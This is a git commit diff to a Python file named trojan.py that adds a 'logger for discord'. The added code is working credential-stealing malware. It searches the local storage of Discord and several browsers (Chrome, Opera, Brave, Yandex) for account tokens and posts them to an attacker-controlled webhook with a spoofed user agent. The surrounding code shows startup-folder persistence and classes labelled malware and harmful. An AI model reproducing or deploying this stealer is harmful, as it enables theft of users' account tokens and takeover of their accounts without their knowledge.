e85090b73d4da778066080f9bf8e6f81e8c5995f
bossjaylen145 <64386453+bossjaylen145@users.noreply.github.com>
2021-05-20 23:05:12 -0400

    added logger for discord

--- trojan.py
+++ trojan.py
@@ -1,5 +1,5 @@
-import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse
-
+import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, re, json
+from urllib.request import Request, urlopen
 
 class harmless:
     """Harmless modules"""
@@ -112,6 +112,7 @@ class malware:
         
 class harmful:
     
+    
     def dump(self):
         """Dumps databases and thing prepared for sending"""
         # WORK ON LATER 
@@ -133,6 +134,77 @@ if __name__ == "__main__":
         shutil.copy2(__file__, startup)
     except:
         pass
+    
+    
+    
+    # your webhook URL
+    WEBHOOK_URL = 'WEBHOOK HERE'
+
+    # mentions you when you get a hit
+    PING_ME = False
+
+    def find_tokens(path):
+        path += '\\Local Storage\\leveldb'
+
+        tokens = []
+
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        return tokens
+
+    def main():
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+
+        paths = {
+            'Discord': f"{roaming}\\Discord",
+            'Discord Canary': f"{roaming}\\discordcanary",
+            'Discord PTB': f"{roaming}\\discordptb",
+            'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
+            'Opera': f"{roaming}\\Opera Software\\Opera Stable",
+            'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+            'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default"
+        }
+
+        message = '@everyone' if PING_ME else ''
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            message += f'\n**{platform}**\n```\n'
+
+            tokens = find_tokens(path)
+
+            if len(tokens) > 0:
+                for token in tokens:
+                    message += f'{token}\n'
+            else:
+                message += 'No tokens found.\n'
+
+            message += '```'
+
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+        }
+
+        payload = json.dumps({'content': message})
+
+        try:
+            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+            urlopen(req)
+        except:
+            pass
+        
+        main()
+    
     
     harmless = harmless()
     malware = malware()
